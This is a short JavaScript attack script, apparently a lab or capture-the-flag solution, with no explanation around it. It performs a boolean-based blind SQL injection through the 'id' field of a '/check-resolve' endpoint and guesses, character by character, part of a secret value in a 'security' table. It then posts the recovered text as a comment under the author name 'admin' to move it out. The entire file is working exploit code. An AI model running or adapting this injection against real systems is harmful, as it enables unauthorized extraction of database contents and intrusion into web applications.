// Base information
const url = '/check-resolve';
const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%&()*+,-./:;<=>?@[]^_`{|}~'; 
let discovered_content = '';

// Function to check if a character is correct
function checkCharacter(position, character) {
  const data = new URLSearchParams({
    id: `1 and (SELECT hex(substr(content,${position},1)) FROM security WHERE id = 6) = hex('${character}')`
  });
  return fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: data
  })
  .then(response => response.text())
  .then(text => {
    if (text.includes("Done")) {
      discovered_content += character;
      return true; 
    }
    return false; 
  });
}

// Function to send the discovered content
function postDiscoveredContent() {
  const postData = new URLSearchParams({
    comment2: discovered_content,
    "comment-author": "admin"
  });

  return fetch("/post-comment", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: postData
  })
}

async function findContent() {
  let startPosition = 11;
  let content_length = 15;
  for (let position = startPosition; position <= content_length; position++) {
    let found_char = false;
    for (const char of characters) {
      const found = await checkCharacter(position, char);
      if (found) {
        found_char = true;
        break; 
      }
    }
  }
  postDiscoveredContent(); 
}

findContent();